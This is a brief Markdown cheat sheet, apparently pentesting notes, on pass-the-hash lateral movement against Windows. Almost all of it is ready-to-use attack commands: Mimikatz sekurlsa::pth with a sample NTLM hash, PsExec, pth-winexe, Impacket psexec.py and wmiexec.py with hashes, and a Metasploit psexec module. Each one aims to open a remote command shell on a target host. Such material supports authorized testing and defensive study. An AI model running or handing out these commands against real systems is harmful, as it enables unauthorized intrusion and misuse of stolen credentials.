# Pass the Hash

### Psexec on windows
```
PsExec.exe \\TARGET-HOSTNAME -u DOMAIN\USERNAME -p PASSWORD cmd.exe
```

### Mimikatz
```
privilege::debug
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND

For example:
sekurlsa::pth /user:pentest /domain:pentest.lab /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:"./PsExec.exe \\TARGET-HOSTNAME cmd.exe"
```

### pth-winexe
```
pth-winexe -U DOMAIN/USERNAME%<LM:NTLM> //TARGET-IP cmd
```

### Impacket Psexec
with credentials
```
python psexec.py <USERNAME>:<PASSWORD>@<TARGET-IP>
```
with hash
```
python psexec.py -hashes <LM:NTLM> <USERNAME>@<TARGET-IP> cmd.exe
```

### Impacket Wmiexec
```
python wmiexec.py -hashes <LM:NTLM> <USERNAME>@<TARGET-IP>
```

### Metasploit
```
exploit/windows/smb/psexec
```

### See also:
* [Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
